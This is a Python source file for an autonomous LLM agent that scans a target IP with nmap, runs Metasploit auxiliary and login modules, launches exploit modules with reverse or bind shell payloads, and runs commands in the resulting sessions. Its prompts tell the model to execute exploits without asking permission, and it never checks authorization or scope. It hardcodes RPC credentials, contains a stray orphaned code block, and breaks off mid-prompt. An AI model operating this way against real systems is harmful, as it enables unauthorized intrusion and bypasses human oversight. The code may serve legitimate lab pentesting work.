from re import S
from typing import TypedDict, Annotated, List, Dict, Optional
from langchain_openai import ChatOpenAI
from langchain_groq import ChatGroq
from langchain_ollama import ChatOllama
from langchain_google_genai import ChatGoogleGenerativeAI
from langchain_core.messages import BaseMessage, HumanMessage, AIMessage, SystemMessage
from langchain_core.tools import tool
from langchain_core.prompts import ChatPromptTemplate, MessagesPlaceholder
from langgraph.graph import StateGraph, END
from langgraph.graph.message import add_messages
from langgraph.prebuilt import ToolNode
from typing import Any
import docker
import time
import re
from pymetasploit3.msfrpc import MsfRpcClient

METASPLOIT_IP="192.168.34.131"
METASPLOIT_USER="msf"
METASPLOIT_PASSWD="my-super-secret-password"
METASPLOIT_PORT=55553
class ReconState(TypedDict):
    ip: str
    user_input: str
    plan: str
    vulns: List[str]
    exploitation_attempt: bool
    shell_success: bool
    active_session_id: Optional[int] # <-- ADD THIS LINE
    report: str
    llm_provider: str
    api_key: str
    local_model: str
    messages: Annotated[List[BaseMessage], add_messages]
    current_step: str
    errors: List[str]
    # Below are scanning node related fields
    scan_results: Dict[str, str] 
    scan_progression: List[str]
    discovered_services: Dict[str, List[str]]
    max_scan_iterations: int

# LLM Configuration
def get_llm(llm_provider: str, api_key: str, local_model: str = None):
    """Factory function to create appropriate LLM instance"""
    if llm_provider == "ollama":
        return ChatOllama(
            model=local_model or "llama2",
            base_url="http://localhost:11434"
        )
    elif llm_provider == "gemini":
        return ChatGoogleGenerativeAI(
            model="gemini-pro",
            google_api_key=api_key
        )
    elif llm_provider == "openai":
        return ChatOpenAI(
            model="gpt-5-mini",
            openai_api_key=api_key
        )
    elif llm_provider == "groq":
        return ChatGroq(
            model="mixtral-8x7b-32768",
            groq_api_key=api_key
        )
    else:
        raise ValueError(f"Unsupported LLM provider: {llm_provider}")

# Tools for Docker/Nmap operations
@tool
def run_nmap_scan(target_ip: str, scan_type: str = "basic") -> str:
    """
    Run nmap scan against target IP
    Args:
        target_ip: IP address to scan
        scan_type: Type of scan
    """
    client = docker.from_env()
    
    # Define scan commands
    scan_commands = {
        "basic": f"nmap -sV {target_ip}",
        "stealth": f"nmap -sS -O {target_ip}",
        "aggressive": f"nmap -A {target_ip}",
        "port_scan": f"nmap -p- {target_ip}",
        "udp": f"nmap -sU {target_ip}",
        "fast_scan": f"nmap -T4 -F {target_ip}",
        "service_scan": f"nmap -sV -sC {target_ip}",
        "top_ports": f"nmap --top-ports 20 {target_ip}",
        "vuln_scan": f"nmap --script vuln {target_ip}"
    }
    
    command = scan_commands.get(scan_type, scan_commands["basic"])
    
    try:
        print(f"  [Docker] Running command: {command}")
        output = client.containers.run('my-nmap:2.0', 
                                        command=command,
                                        remove=True).decode('utf-8')
        
        return f"Nmap scan completed:\n{output}"
        
    except Exception as e:
        return f"Nmap scan failed: {str(e)}"

@tool
def run_metasploit_auxiliary(target_ip: str, module_name: str, options: Dict[str, Any] = None) -> str:
    """
    Run Metasploit auxiliary module using console interface to capture output and do vulnerability assesment
    """
    try:
        msf_client = MsfRpcClient(
            password=METASPLOIT_PASSWD,
            user=METASPLOIT_USER, 
            server=METASPLOIT_IP,
            port=55553, 
            ssl=True
        )
        
        if not msf_client.authenticated:
            return "Failed to authenticate with Metasploit RPC"
        
        # Create a console
        console = msf_client.consoles.console()
        console_id = console.cid
        
        # Build the command string
        commands = [
            f"use auxiliary/{module_name}",
            f"set RHOSTS {target_ip}"
        ]
        
        # Add options if provided
        if options and isinstance(options, dict):
            for key, value in options.items():
                commands.append(f"set {key} {value}")
        
        # Add run command
        commands.append("run")
        
        
        full_output = []
        # Execute commands
        for cmd in commands:
            console.write(cmd)
            # Wait a bit for command to process
            import time
            time.sleep(1)
            
            # Read output
            output = console.read()
            if output['data']:
                full_output.append(f"Command: {cmd}")
                full_output.append(output['data'])
        
        # Wait for module to complete
        time.sleep(5)
        
        # Get final output
        final_output = console.read()
        if final_output['data']:
            full_output.append("Final output:")
            full_output.append(final_output['data'])
        
        # Destroy console
        console.destroy()
        
        result = f"Module '{module_name}' executed against {target_ip}\n"
        result += "Console output:\n"
        result += "\n".join(full_output)
        
        return result
        
    except Exception as e:
        import traceback
        return f"Console execution failed: {str(e)}\nDetails: {traceback.format_exc()}"

    """
    Interact with an established Metasploit shell session.
    Args:
        session_id: The ID of the active session to interact with.
        command: The command to execute in the shell (e.g., 'whoami', 'ls -la').
    """
    print(f"  [Shell] Interacting with session {session_id}, running command: {command}")
    try:
        # Connect to Metasploit RPC
        msf_client = MsfRpcClient(
            password='my-super-secret-password',
            user='msf', 
            server='192.168.34.131',
            port=55553, 
            ssl=True
        )

        # Check if the session exists
        if session_id not in msf_client.sessions.list:
            return f"Error: Session {session_id} not found. Available sessions: {list(msf_client.sessions.list.keys())}"

        # Get the shell object
        shell = msf_client.sessions.session(session_id)
        
        # Write the command to the shell
        shell.write(command)
        
        # Wait a moment for the command to execute
        time.sleep(2)
        
        # Read the output
        output = shell.read()
        
        if output:
            return f"Command '{command}' executed on session {session_id}:\n---\n{output}\n---"
        else:
            return f"Command '{command}' executed, but produced no output."

    except Exception as e:
        return f"Failed to interact with shell {session_id}: {str(e)}"

@tool
def run_metasploit_exploit(target_ip: str, module_name: str, payload: str, options: Dict[str, Any] = None) -> str:
    """
    Run a Metasploit exploit module to establish a shell.
    Args:
        target_ip: Target IP address.
        module_name: Metasploit exploit module name (e.g., 'unix/ftp/vsftpd_234_backdoor').
        payload: Payload to use (e.g., 'cmd/unix/interact').
        options: Additional options for the module.
    """
    print(f"  [Exploit] Attempting {module_name} with payload {payload} against {target_ip}")
    try:
        msf_client = MsfRpcClient(
            password=METASPLOIT_PASSWD,
            user=METASPLOIT_USER, 
            server=METASPLOIT_IP,
            port=55553, 
            ssl=True
        )

        if not msf_client.authenticated:
            return "Failed to authenticate with Metasploit RPC for exploitation."

        # Get the exploit modules
        try:
            exploit = msf_client.modules.use('exploit', module_name)
        except Exception as e:
            return f"❌ FAILED: Unable to load exploit module '{module_name}': {str(e)}"
        
        # Set basic options
        exploit['RHOSTS'] = target_ip
        
        # Validate and set payload
        try:
            # Get compatible payloads for this exploit
            compatible_payloads = exploit.targetpayloads()
            print(f"  [Debug] Available payloads: {compatible_payloads}")  # Show first 10
            
            # Check if requested payload is compatible
            if payload not in compatible_payloads:
                # Try to find a similar compatible payload
                fallback_payloads = [
                    'cmd/unix/interact',
                    'generic/shell_reverse_tcp', 
                    'generic/shell_bind_tcp',
                    'cmd/unix/reverse'
                ]
                
                chosen_payload = None
                for fallback in fallback_payloads:
                    if fallback in compatible_payloads:
                        chosen_payload = fallback
                        break
                
                if chosen_payload:
                    print(f"  [Info] Payload '{payload}' not compatible, using '{chosen_payload}' instead")
                    payload = chosen_payload
                else:
                    # Just use the first available payload
                    if compatible_payloads:
                        payload = compatible_payloads[0]
                        print(f"  [Info] Using first available payload: '{payload}'")
                    else:
                        return f"❌ FAILED: No compatible payloads found for module '{module_name}'"
            
            exploit.payload = payload
            
        except Exception as e:
            return f"❌ FAILED: Payload configuration error: {str(e)}"

        # Add any additional options
        if options and isinstance(options, dict):
            for key, value in options.items():
                try:
                    exploit[key] = value
                except Exception as e:
                    print(f"[Warning] Could not set option {key}={value}: {str(e)}")

        # Execute the exploit
        try:
            print(f"  [Exploit] Executing {module_name} with payload {payload}")
            job_result = exploit.execute(payload=payload)
            
            # Handle different return types from execute()
            if isinstance(job_result, dict) and 'job_id' in job_result:
                job_id = job_result['job_id']
                print(f"  [Exploit] Started as job ID: {job_id}. Waiting for session...")
            elif isinstance(job_result, bool):
                if job_result:
                    print(f"  [Exploit] Exploit executed successfully. Waiting for session...")
                    job_id = None
                else:
                    return f"❌ FAILED: Exploit execution returned False"
            else:
                print(f"  [Exploit] Exploit executed (return type: {type(job_result)}). Waiting for session...")
                job_id = None

        except Exception as e:
            return f"❌ FAILED: Exploit execution failed: {str(e)}"

        # Wait for session creation
        print(f"  [Exploit] Waiting 15 seconds for session creation...")
        time.sleep(15)

        # Check for new sessions
        try:
            sessions = msf_client.sessions.list
            print(type(msf_client.sessions))
            print(f"  [Debug] Current sessions: {list(sessions)}")
            
            if sessions:
                # Look for the most recent session
                latest_session_id = max(sessions.keys(), key=int)
                session = msf_client.sessions.session(latest_session_id)
                
                # Try different ways to get session info
                session_info = "Unknown"
                try:
                    if hasattr(session, 'info'):
                        session_info = session.info
                    elif hasattr(session, 'description'):
                        session_info = session.description  
                    elif hasattr(session, 'type'):
                        session_info = f"Type: {session.type}"
                    
                    # Check if session is from our exploit (basic heuristic)
                    session_is_ours = True  # Assume it's ours if it's the latest
                    
                    if session_is_ours:
                        return f"✅ SUCCESS: Exploit '{module_name}' created session {latest_session_id}. Session info: {session_info}"
                
                except Exception as session_error:
                    print(f"  [Warning] Could not get session info: {session_error}")
                    # Still consider it a success if we have a session
                    return f"✅ SUCCESS: Exploit '{module_name}' created session {latest_session_id}."
            
            # No sessions found
            if job_id:
                try:
                    job_info = msf_client.jobs.info(job_id)
                    return f"❌ FAILED: Exploit '{module_name}' completed but no session was created. Job info: {job_info}"
                except:
                    return f"❌ FAILED: Exploit '{module_name}' completed but no session was created."
            else:
                return f"❌ FAILED: Exploit '{module_name}' completed but no session was created."

        except Exception as e:
            return f"❌ FAILED: Error checking for sessions: {str(e)}"

    except Exception as e:
        import traceback
        return f"❌ FAILED: Exploitation failed with error: {str(e)}\nTraceback: {traceback.format_exc()}"


@tool
def interact_with_shell(session_id: int) -> str:
    """
    Start an interactive shell session with an established Metasploit shell.
    
    Args:
        session_id: The ID of the active session to interact with.
    
    Returns:
        str: A message indicating the session has ended or an error message.
    """
    print(f"[Shell] Starting interactive session with session {session_id}")
    try:
        # Initialize Metasploit RPC client
        msf_client = MsfRpcClient('my-super-secret-password', user='msf', server='192.168.34.131', port=55553, ssl=True)
        session_id_str = str(session_id)
        
        # Check if the session exists
        if session_id_str not in msf_client.sessions.list:
            return f"Error: Session {session_id} not found. Available sessions: {list(msf_client.sessions.list.keys())}"
        
        # Get the shell session
        shell = msf_client.sessions.session(session_id_str)
        
        print(f"[Shell] Connected to session {session_id}. Type 'exit' to quit.")
        print("Enter commands below (output may take a moment to appear):")
        
        while True:
            # Get user input
            command = input(f"[Session {session_id}]> ")
            
            # Check for exit condition
            if command.lower() in ['exit', 'quit']:
                print(f"[Shell] Closing interactive session {session_id}")
                return f"Interactive session {session_id} ended."
            
            # Send command to the shell
            shell.write(f"{command}\n")
            
            # Wait briefly and read output (adjust timing as needed)
            time.sleep(1)  # Reduced delay for responsiveness
            output = shell.read()
            
            # Display output
            if output.strip():
                print(f"\n[Output]\n---\n{output}\n---")
            else:
                print("[No output or command still processing]")
                
    except Exception as e:
        error_msg = f"Failed to interact with shell {session_id}: {str(e)}"
        print(error_msg)
        return error_msg

# Adding tools to the toollist
tools = [run_nmap_scan, run_metasploit_auxiliary, run_metasploit_exploit, interact_with_shell]
tool_node = ToolNode(tools)

def planning_node(state: ReconState) -> ReconState:
    """Generate reconnaissance plan using LLM"""

    print("Entering planning_node")
    state['current_step'] = 'planning'
    
    llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
    
    system_prompt = """You are a cybersecurity expert creating a reconnaissance plan.
    Generate a comprehensive but concise reconnaissance plan for the target IP.
    
    Include these phases:
    1. Initial reconnaissance (whois, DNS)
    2. Port scanning strategy
    3. Service enumeration
    4. Vulnerability assessment approach
    5. Potential exploitation vectors
    
    Be specific about tools and techniques.
    End your response with 'PLAN_COMPLETE'"""
    
    prompt = ChatPromptTemplate.from_messages([
        ("system", system_prompt),
        ("human", "Create a reconnaissance plan for IP: {ip}\nUser requirements: {user_input}")
    ])
    
    try:
        #prompt formats the messages using variables (like {ip}, {user_input}),then the result is sent into the LLM.
        chain = prompt | llm
        response = chain.invoke({
            "ip": state['ip'],
            "user_input": state['user_input']
        })
        
        state['messages'].append(AIMessage(content=response.content))
        state['plan']=response.content
        print("Planning completed successfully")
        
    except Exception as e:
        error_msg = f"Planning failed: {str(e)}"
        print(error_msg)
        state['errors'].append(error_msg)
        state['messages'].append(AIMessage(content=error_msg))
    
    return state

#Helper function for the scan node
def parse_scan_results(scan_output: str) -> Dict[str, List[str]]:
    """Parse nmap scan output to extract discovered services"""
    services = {}
    lines = scan_output.split('\n')
    
    for line in lines:
        # Look for open ports (format: PORT/tcp open service)
        if '/tcp' in line and 'open' in line:
            parts = line.split()
            if len(parts) >= 3:
                port = parts[0].split('/')[0]
                service = parts[2] if len(parts) > 2 else 'unknown'
                if port not in services:
                    services[port] = []
                services[port].append(service)
        elif '/udp' in line and 'open' in line:
            parts = line.split()
            if len(parts) >= 3:
                port = parts[0].split('/')[0]
                service = parts[2] if len(parts) > 2 else 'unknown'
                if port not in services:
                    services[port] = []
                services[port].append(service)
    
    return services

#Helper function for the scan node 
def determine_next_scan_type(state: ReconState, plan_content: str) -> tuple:
    """Determine the next scan type based on current state and plan"""
    scan_progression = state.get('scan_progression', [])
    discovered_services = state.get('discovered_services', {})
    
    if not scan_progression:
        return "fast_scan", None
    
    # If fast scan done but no service scan, do detailed service enumeration
    if "fast_scan" in scan_progression and "service_scan" not in scan_progression:
        if discovered_services:
            ports = ",".join(discovered_services.keys())
            return "service_scan", ports
        else:
            return "top_ports", None
    
    # If services but no vulnerability scan
    if discovered_services and "vuln_scan" not in scan_progression:
        return "vuln_scan", None
    
    # If plan mentions UDP and we haven't done UDP scan
    if "udp" not in scan_progression and ("udp" in plan_content.lower() or "snmp" in plan_content.lower()):
        return "udp", None
    
    # If limited services found, try comprehensive port scan
    if len(discovered_services) < 3 and "port_scan" not in scan_progression:
        return "port_scan", None
    
    # If we have services but no OS detection
    if discovered_services and "aggressive" not in scan_progression:
        return "aggressive", None
    
    # No more scans needed
    return None, None

def scan_node(state: ReconState) -> ReconState:
    """Execute network scanning using tools with progressive scan logic"""
    print("Entering scan_node")
    state['current_step'] = 'scanning'
    
    # Initialize scan tracking fields if not present
    if 'scan_progression' not in state:
        state['scan_progression'] = []
    if 'discovered_services' not in state:
        state['discovered_services'] = {}
    if 'max_scan_iterations' not in state:
        state['max_scan_iterations'] = 4
    
    # Checking for the plan
    plan_content = ""
    for msg in reversed(state['messages']):
        if isinstance(msg, AIMessage) and 'PLAN_COMPLETE' in msg.content:
            plan_content = msg.content
            break
    
    next_scan_type, target_ports = determine_next_scan_type(state, plan_content)
    
    if not next_scan_type:
        print("No additional scans needed based on current results")
        return state
    
    print(f"Executing {next_scan_type} scan (iteration {len(state['scan_progression']) + 1})")
    
    llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
    llm_with_tools = llm.bind_tools(tools)
    
    system_prompt = """You are a network scanning specialist executing a progressive scanning strategy.

    CURRENT SCAN PROGRESSION: {progression}
    DISCOVERED SERVICES SO FAR: {services}
    NEXT RECOMMENDED SCAN: {scan_type}
    TARGET PORTS: {ports}
    
    Based on the progressive scanning strategy, you **MUST** execute the {scan_type} scan.
    
    Call the `run_nmap_scan` tool with the `scan_type` parameter set to '{scan_type}'.
    
    Do not ask for permission. Execute the scan immediately."""
    
    prompt = ChatPromptTemplate.from_messages([
        ("system", system_prompt),
        ("human", "Execute the next scan for IP: {ip} based on the plan: {plan}"),
        MessagesPlaceholder(variable_name="messages")
    ])
    
    try:
        chain = prompt | llm_with_tools

        response = chain.invoke({
            "ip": state['ip'],
            "plan": plan_content,
            "progression": state['scan_progression'],
            "services": state['discovered_services'],
            "scan_type": next_scan_type,
            "ports": target_ports if target_ports else 'All relevant ports',
            "messages": []
        })
        
        state['messages'].append(response)
        
        if response.tool_calls:
            tool_results = tool_node.invoke({"messages": [response]})
            state['messages'].extend(tool_results['messages'])
            
            scan_executed = False
            for msg in tool_results['messages']:
                if hasattr(msg, 'content') and 'scan completed' in msg.content:
                    scan_key = f"nmap_{next_scan_type}"
                    state['scan_results'][scan_key] = msg.content
                    
                    new_services = parse_scan_results(msg.content)
                    if new_services:
                        state['discovered_services'].update(new_services)
                        print(f"New services discovered: {new_services}")
                    
                    if next_scan_type not in state['scan_progression']:
                        state['scan_progression'].append(next_scan_type)
                    
                    scan_executed = True
                    print(f"Successfully executed {next_scan_type} scan. Total services: {len(state['discovered_services'])}")
                    break
            
            if not scan_executed:
                print(f"Tool calls made but no scan completion detected for {next_scan_type}")
                
        else:
            print(f"No tool calls made for {next_scan_type} scan")
            state['scan_results'][f'nmap_{next_scan_type}'] = f"No {next_scan_type} scan executed"
            
    except Exception as e:
        error_msg = f"{next_scan_type} scanning failed: {str(e)}"
        print(error_msg)
        state['errors'].append(error_msg)
        state['scan_results'][f'nmap_{next_scan_type}'] = error_msg
    
    print(f"Scan node complete. Progression: {state['scan_progression']}, Services: {len(state['discovered_services'])}")
    return state

# Helper function that is used in a conditional edge 
def should_continue_scanning(state: ReconState) -> str:
    """
    Decide whether to continue scanning or move to vulnerability assessment
    Returns: 'scan' to continue scanning, 'vuln_assessment' to move forward
    """
    print(f"Evaluating scan continuation...")
    print(f"  Current progression: {state.get('scan_progression', [])}")
    print(f"  Discovered services: {len(state.get('discovered_services', {}))}")
    print(f"  Max iterations: {state.get('max_scan_iterations', 4)}")
    
    # Check iteration limit
    max_iterations = state.get('max_scan_iterations', 4)
    current_iterations = len(state.get('scan_progression', []))
    
    if current_iterations >= max_iterations:
        print(f"  → Max iterations reached ({current_iterations}/{max_iterations}), moving to vulnerability assessment")
        return "vuln_assessment"
    
    # Get plan content for context
    plan_content = ""
    for msg in reversed(state.get('messages', [])):
        if isinstance(msg, AIMessage) and 'PLAN_COMPLETE' in msg.content:
            plan_content = msg.content.lower()
            break
    
    # Determine if there's a logical next scan
    next_scan_type, _ = determine_next_scan_type(state, plan_content)
    
    if next_scan_type:
        print(f"  → Continue scanning with {next_scan_type}")
        return "scan"
    else:
        print(f"  → No more scans needed, moving to vulnerability assessment")
        return "vuln_assessment"

# Vulnerability Assessment Node
def vuln_assessment_node(state: ReconState) -> ReconState:
    """Simplified vulnerability assessment with cleaner prompting"""
    print("Entering vuln_assessment_node")
    state['current_step'] = 'vulnerability_assessment'
    
    llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
    llm_with_tools = llm.bind_tools(tools)
    
    # Get scan results
    scan_results = state.get('scan_results', {})
    
    if not scan_results:
        print("No scan results available for vulnerability assessment")
        state['vulns'] = ["No scan results available for vulnerability assessment"]
        return state
    
    # Prepare scan results summary
    scan_summary = ""
    for scan_name, scan_output in scan_results.items():
        if isinstance(scan_output, str):
            # Keep it simple - just truncate if too long
            if len(scan_output) > 1500:
                scan_output = scan_output[:1500] + "\n[... truncated ...]"
            scan_summary += f"\n=== {scan_name} ===\n{scan_output}\n"

    # Simpler system prompt without complex formatting
    system_prompt = f"""You are a vulnerability assessment specialist. 

    Your task is to analyze the scan results and run appropriate Metasploit auxiliary modules to test for vulnerabilities.

    TARGET IP: {state['ip']}

    AVAILABLE MODULES:
    - FTP services: scanner/ftp/ftp_version AND scanner/ftp/anonymous  
    - SSH services: scanner/ssh/ssh_version AND scanner/ssh/ssh_login
    - HTTP services: scanner/http/http_version AND scanner/http/dir_scanner
    - SMB services: scanner/smb/smb_version AND scanner/smb/smb_login
    - MySQL services: scanner/mysql/mysql_version AND scanner/mysql/mysql_login
    - PostgreSQL: scanner/postgres/postgres_version
    - Telnet: scanner/telnet/telnet_version

    CRITICAL INSTRUCTIONS:
    1. You MUST call run_metasploit_auxiliary multiple times - once for EACH service you find
    2. For EACH open port/service, run AT LEAST ONE auxiliary module
    3. If you see FTP (port 21), run BOTH scanner/ftp/ftp_version AND scanner/ftp/anonymous
    4. If you see SSH (port 22), run BOTH scanner/ssh/ssh_version AND scanner/ssh/ssh_login  
    5. If you see HTTP (port 80), run BOTH scanner/http/http_version AND scanner/http/dir_scanner
    6. If you see SMB (port 139/445), run BOTH scanner/smb/smb_version AND scanner/smb/smb_login
    7. If you see MySQL (port 3306), run BOTH scanner/mysql/mysql_version AND scanner/mysql/mysql_login

    EXAMPLE: If scan shows FTP, SSH, and HTTP services, you should make 6 tool calls:
    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/ftp/ftp_version")
    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/ftp/anonymous")  
    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/ssh/ssh_version")
    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/ssh/ssh_login")
    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/http/http_version")  
    - run_metasploit_auxiliary(target_ip="{state['ip']}", module_name="scanner/http/dir_scanner")

    Execute ALL relevant modules now - do not stop after just one!"""
        
    try:
        # Use invoke directly instead of complex prompt template
        messages = [
            ("system", system_prompt),
            ("human", f"Analyze these scan results and run vulnerability tests:\n\n{scan_summary}\n\nBased on the open services found, execute appropriate Metasploit auxiliary modules.")
        ]
        
        response = llm_with_tools.invoke(messages)
        state['messages'].append(response)
        
        if response.tool_calls:
            print(f"Executing {len(response.tool_calls)} vulnerability assessment tool calls")
            tool_results = tool_node.invoke({"messages": [response]})
            state['messages'].extend(tool_results['messages'])
            
            # Extract results
            results_content = ""
            for msg in tool_results['messages']:
                if hasattr(msg, 'content'):
                    results_content += f"{msg.content}\n"
            
            # Simple analysis without complex templating
            analysis_response = llm.invoke([
                ("human", f"Summarize these vulnerability assessment results:\n\n{results_content}\n\nProvide a brief summary of services tested and any findings.")
            ])
            
            # Store results
            state['vulns'] = [
                {
                    'type': 'assessment_summary',
                    'content': analysis_response.content
                }
                # {
                #     'type': 'raw_results', 
                #     'content': results_content
                # }
            ]
            
        else:
            print("No tool calls made during vulnerability assessment")
            state['vulns'] = [{
                'type': 'no_assessment',
                'content': 'No vulnerability assessment tools were executed'
            }]
            
    except Exception as e:
        error_msg = f"Vulnerability assessment failed: {str(e)}"
        print(error_msg)
        state['errors'].append(error_msg)
        state['vulns'] = [{
            'type': 'error',
            'content': error_msg,
            'severity': 'error'
        }]
    
    print(f"Vulnerability assessment complete. Found {len(state['vulns'])} assessment items")
    return state

# Exploitation Node
def exploitation_node(state: ReconState) -> ReconState:
    """Analyze vulnerabilities and attempt multiple exploits to gain a shell."""
    print("Entering exploitation_node")
    state['current_step'] = 'exploitation'
    state['exploitation_attempt'] = True
    
    # Store detailed exploit results for debugging
    state['exploit_attempts'] = []
    
    vuln_summary = ""
    for v in state.get('vulns', []):
        vuln_summary += v.get('content', '') + "\n"

    if not vuln_summary:
        state['scan_results']['exploit'] = "No vulnerability data to attempt exploitation."
        return state

    llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
    
    # Only bind exploit tools
    exploit_tools = [run_metasploit_exploit]
    llm_with_tools = llm.bind_tools(exploit_tools)

    system_prompt = f"""You are an intelligent penetration testing expert who analyzes vulnerabilities and selects appropriate exploits.

    TARGET IP: {state['ip']}

    YOUR TASK: Analyze the vulnerability assessment results and intelligently select the most appropriate Metasploit exploit modules to try.

    ANALYSIS APPROACH:
    1. Look for specific service versions and known vulnerabilities
    2. Match services to appropriate exploit modules
    3. Choose payloads that are most likely to work
    4. Try multiple different approaches if the first ones fail

    COMMON METASPLOIT MODULES BY SERVICE:
    - FTP (especially vsftpd 2.3.4): unix/ftp/vsftpd_234_backdoor
    - SSH weak auth: auxiliary/scanner/ssh/ssh_login (but use exploit modules)  
    - Samba/SMB: linux/samba/trans2open, linux/samba/is_known_pipename
    - Apache/HTTP: multi/http/*, exploit/linux/http/*
    - Bindshells: multi/handler with bind payloads
    - Distcc: unix/misc/distcc_exec
    - IRC (UnrealIRCd): unix/irc/unreal_ircd_3281_backdoor
    - Java RMI: multi/misc/java_rmi_server
    - MySQL: multi/mysql/*
    - PostgreSQL: multi/postgres/*

    PAYLOAD SELECTION GUIDE:
    - cmd/unix/interact: Simple command shell (good for backdoors)
    - cmd/unix/reverse: Reverse command shell
    - generic/shell_reverse_tcp: More robust reverse shell
    - generic/shell_bind_tcp: Bind shell (for direct connections)

    INSTRUCTIONS:
    1. You will be called multiple times - each time, choose a DIFFERENT exploit to try
    2. Base your choices on the vulnerability assessment data
    3. Start with the most promising exploits first
    4. If previous attempts failed, try different approaches
    5. Execute ONE exploit per call using run_metasploit_exploit

    Be intelligent and adaptive in your choices based on the actual services and vulnerabilities found.
    """
    
    max_attempts = 6
    attempt_count = 0
    attempted_modules = set()  # Track what we've already tried
    
    while attempt_count < max_attempts and not state.get('shell_success', False):
        attempt_count += 1
        print(f"\n--- Exploitation Attempt {attempt_count}/{max_attempts} ---")
        
        # Build context about previous attempts
        previous_attempts = ""
        if attempted_modules:
            previous_attempts = f"\n\nPREVIOUS FAILED ATTEMPTS: {', '.join(attempted_modules)}\nDo NOT repeat these modules. Try something different."
        
        prompt_text = f"""Attempt #{attempt_count}: 
        
        Analyze the vulnerability data and choose the most appropriate exploit module to try next.
        Consider the services found and their versions.{previous_attempts}
        
        Execute ONE exploit now using run_metasploit_exploit."""
        
        try:
            response = llm_with_tools.invoke([
                ("system", system_prompt),
                ("human", f"Vulnerability Assessment Results:\n\n{vuln_summary}\n\n{prompt_text}")
            ])
            
            state['messages'].append(response)
            
            print(f"--- LLM Response Attempt {attempt_count} ---")
            if response.tool_calls:
                print(f"Tool calls: {len(response.tool_calls)}")
                for call in response.tool_calls:
                    print(f"  Module: {call['args'].get('module_name', 'unknown')}")
                    print(f"  Payload: {call['args'].get('payload', 'unknown')}")
                    attempted_modules.add(call['args'].get('module_name', 'unknown'))
            else:
                print("No tool calls made")
                continue
            
            if response.tool_calls:
                # Execute the exploit
                exploit_tool_node = ToolNode(exploit_tools)
                tool_results = exploit_tool_node.invoke({"messages": [response]})
                state['messages'].extend(tool_results['messages'])
                
                # Process results and capture detailed output
                for msg in tool_results['messages']:
                    if hasattr(msg, 'content'):
                        # Store detailed attempt info
                        attempt_info = {
                            'attempt': attempt_count,
                            'module': response.tool_calls[0]['args'].get('module_name', 'unknown'),
                            'payload': response.tool_calls[0]['args'].get('payload', 'unknown'),
                            'full_output': msg.content,
                            'success': False
                        }
                        
                        print(f"\n--- DETAILED EXPLOIT OUTPUT (Attempt {attempt_count}) ---")
                        print(msg.content)
                        print("--- END EXPLOIT OUTPUT ---\n")
                        
                        if "✅ SUCCESS" in msg.content:
                            print(f"SUCCESS on attempt {attempt_count}!")
                            state['shell_success'] = True
                            attempt_info['success'] = True
                            # Extract session ID
                            match = re.search(r"session (\d+)", msg.content)
                            if match:
                                state['active_session_id'] = int(match.group(1))
                                print(f"  Active session ID: {state['active_session_id']}")
                                attempt_info['session_id'] = int(match.group(1))
                        elif "❌ FAILED" in msg.content:
                            print(f"Attempt {attempt_count} failed - analyzing output for debugging...")
                            # Extract failure reason for debugging
                            if "no session was created" in msg.content.lower():
                                print("  Failure reason: No session created (exploit may have run but target not vulnerable)")
                            elif "failed to start" in msg.content.lower():
                                print("  Failure reason: Exploit failed to start (module/payload issue)")
                            elif "connection refused" in msg.content.lower():
                                print("  Failure reason: Connection refused (service not accessible)")
                        
                        state['exploit_attempts'].append(attempt_info)
                
                if state.get('shell_success', False):
                    break
                    
        except Exception as e:
            print(f"Error on attempt {attempt_count}: {str(e)}")
            state['exploit_attempts'].append({
                'attempt': attempt_count,
                'error': str(e),
                'success': False
            })
            continue
            
        # Small delay between attempts
        import time
        time.sleep(3)
    
    if not state.get('shell_success', False):
        print(f"\nALL EXPLOITATION ATTEMPTS FAILED after {attempt_count} tries")
        print(f"Modules attempted: {', '.join(attempted_modules)}")
        
        # Print summary of all attempts for debugging
        print("\n=== EXPLOITATION SUMMARY ===")
        for attempt in state.get('exploit_attempts', []):
            print(f"Attempt {attempt.get('attempt', 'N/A')}: {attempt.get('module', 'N/A')} -> {'SUCCESS' if attempt.get('success') else 'FAILED'}")
            if 'error' in attempt:
                print(f"  Error: {attempt['error']}")

    return state

def post_exploitation_node(state: ReconState) -> ReconState:
    """Perform basic enumeration after gaining shell access."""
    print("Entering post_exploitation_node")
    state['current_step'] = 'post_exploitation'
    
    if not state['shell_success'] or state['active_session_id'] is None:
        return state
        
    session_id = state['active_session_id']
    llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
    llm_with_tools = llm.bind_tools(tools)

    system_prompt = f"""You are an ethical hacker with a shell on the target system (Session ID: {session_id}). 
    Your goal is to perform basic enumeration.
    
    INSTRUCTIONS:
    1. Use the `interact_with_shell` tool to run commands.
    2. Run the following commands ONE BY ONE to understand the system:
        - `whoami` (to see the current user)
        - `uname -a` (to get OS and kernel info)
        - `id` (to see user and group info)
    
    Execute these commands now.
    """
    
    messages = [("system", system_prompt)]
    
    response = llm_with_tools.invoke(messages)
    state['messages'].append(response)
    
    if response.tool_calls:
        tool_results = tool_node.invoke({"messages": [response]})
        state['messages'].extend(tool_results['messages'])
        print(f"  [Post-Exploit] Ran {len(response.tool_calls)} enumeration commands.")

    return state

# Helper function for the conditional edge
def should_continue_to_post_exploit(state: ReconState) -> str:
    """Determines whether to go to post-exploitation or to the final report."""
    if state.get("shell_success"):
        print("  [Graph] Shell success is TRUE. Routing to post_exploitation.")
        return "post_exploitation"
    else:
        print("  [Graph] Shell success is FALSE. Routing to analysis.")
        return "analysis"

# Analysis and Reporting Node
def analysis_node(state: ReconState) -> ReconState:
    """Generate comprehensive analysis and report"""
    print("Entering analysis_node")
    state['current_step'] = 'analysis'
    
    llm = get_llm(state['llm_provider'], state['api_key'], state['local_model'])
    
    system_prompt = """You are a cybersecurity analyst creating a comprehensive penetration testing report.
    
    Generate a detailed report that includes:
    1. Executive Summary
    2. Scope and Methodology  
    3. Reconnaissance Findings
    4. Vulnerability Assessment Results
    5. Exploitation Attempts and Results
    6. Risk Assessment
    7. Recommendations
    8. Technical Details
    
    Make the report professional, thorough, and actionable.
